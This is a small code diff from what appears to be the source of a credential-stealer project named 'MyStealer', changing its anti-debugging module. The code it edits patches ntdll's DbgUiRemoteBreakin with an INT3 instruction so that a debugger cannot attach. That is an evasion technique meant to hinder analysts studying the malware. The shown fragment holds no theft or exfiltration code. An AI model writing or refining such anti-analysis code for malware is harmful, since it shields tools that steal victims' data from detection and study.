@@ -1,5 +1,5 @@
 ﻿using System.Diagnostics;
-using static MyStealer.AntiDebug.Win32Calls;
+using static MyStealer.AntiDebug.NativeCalls;
 
 namespace MyStealer.AntiDebug.Prevention
 {
@@ -12,7 +12,7 @@ namespace MyStealer.AntiDebug.Prevention
 
         public override bool PreventPassive()
         {
-            var ntdll = GetModuleHandle("ntdll");
+            var ntdll = GetModuleHandleA("ntdll.dll");
             var proc = GetProcAddress(ntdll, "DbgUiRemoteBreakin");
             var instr = new byte[] { 0xCC }; // INT3
             return WriteProcessMemory(Process.GetCurrentProcess().SafeHandle, proc, instr, 1, 0);
